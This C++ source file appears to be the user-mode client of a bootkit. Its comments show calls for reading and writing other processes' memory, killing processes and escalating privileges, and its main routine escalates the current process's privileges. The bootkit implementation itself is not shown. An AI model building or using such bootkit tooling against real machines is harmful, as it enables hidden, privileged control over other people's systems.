#include "pch.h"

/*
    Example Usage

    <- Write to process memory ->
    uint64_t value_to_write = 123;
    bootkit.write_process_memory(process_id, 0x1F61261E588, &value_to_write, sizeof(uint64_t));

    <- Read from process memory ->
    uint64_t value_read = 0;
    bootkit.read_process_memory(process_id, 0x1F61261E588, &value_read, sizeof(uint64_t));

    <- Kill a process by its ID ->
    bootkit.kill_process(process_id);

    <- Perform privilege escalation on a process ->
    bootkit.privilege_escalation(process_id);
*/

int main() 
{
    Bootkit bootkit;

    std::cout << "Press Enter to escalate privileges for the current process..." << std::endl;
    std::cin.get();

    if (bootkit.privilege_escalation() == 0) 
    {
        std::cout << "Privilege escalation successful!" << std::endl;
    }
    else
    {
        std::cout << "Failed to escalate privileges." << std::endl;
    }

    system("pause");
}